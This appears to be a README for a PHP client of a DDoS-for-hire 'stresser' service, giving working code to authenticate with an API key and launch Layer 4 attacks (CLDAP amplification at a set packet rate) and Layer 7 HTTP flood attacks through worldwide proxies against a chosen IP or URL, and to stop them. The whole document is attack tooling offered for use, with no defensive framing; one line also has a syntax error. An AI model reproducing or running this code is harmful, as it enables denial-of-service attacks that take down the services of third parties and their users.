# Instant-Stresser-API
Sample API usage of Instant-Stresser.com

## Requirements
PHP version 5.x (+).<br/>
Libcurl package.

## L4/L7 Methods Syntaxe
Available here : https://instant-stresser.com/help/methodsdoc

## Authentication
```php
require 'API.php';
// UserID and API Key generated from API Manager website.
$userID = 123456789;
$apiKey = "ABCD-123";
$api = new API($userID, $apiKey);
```

## Layer 4 Attack
```php

$host = "1.1.1.1";
$port = "80;
$time = "15";
$method = "CLDAP";
$slots = 1;
$pps = 100000;

/* Parameters : IPv4 , Port , Time , Method , Slots, PPS */
$response = $api->startL4($host, $port, $time, $method, $slots, $pps);
```
## Layer 7 Attack
```php

$host = "https://example.com/";
$time = "15";
$method = "JSDOM";
$slots = 1;
$origin = "Worldwide";
$requesttype = "GET";
$ratelimit = "false";

/* Parameters : URL , Time , Method , Slots , Type, Origin Proxy, Ratelimit (true = enable, false = disabled) */
$response = $api->startL7($host, $time, $method, $slots, $requesttype, $origin, $ratelimit);
```
## Stop Attack
```php
/* Parameters : Host. */
$response = $api->stopAttack("1.1.1.1");
```

## API Response
```php
echo $response; // Get API response.
```
